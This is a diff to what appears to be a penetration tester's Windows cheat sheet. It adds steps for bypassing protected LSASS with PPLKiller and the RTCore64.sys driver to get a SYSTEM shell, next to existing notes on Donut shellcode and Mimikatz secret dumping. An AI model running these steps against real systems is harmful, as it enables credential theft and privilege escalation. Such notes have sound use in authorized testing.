@@ -68,7 +68,7 @@ Poweshell Contrained Language Mode
   
 Antivirus Info
   WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
-  
+
 Donut
   Remove old versions: pip3 uninstall donut-shellcode
   Install: pip3 install donut-shellcode
@@ -310,6 +310,11 @@ PrivEsc
     shell reg query "hklm\system\currentcontrolset\control\lsa" 
       LSA Protection: RunAsPPL (0x1 = Protected; Reboot required if changed to 0)
       Credential Guard: LsaCfgFlagsDefault (Windows Defender Credential Guard with UEFI lock, set it to 2 to enable Windows Defender Credential Guard without lock, and set it to 0 to disable it.)
+  
+  Bypass Protected LSASS
+    Execute:PPLKiller /InstallDriver (loads RTCore64.sys driver)
+    Execute: PPLKiller /makeSYSTEMcmd (Gets SYSTEM shell
+    Execute: PPLKiller /uninstallDriver (removes driver)
   
   Mimikatz
     lsadump::secrets (Only SYSTEM can read)
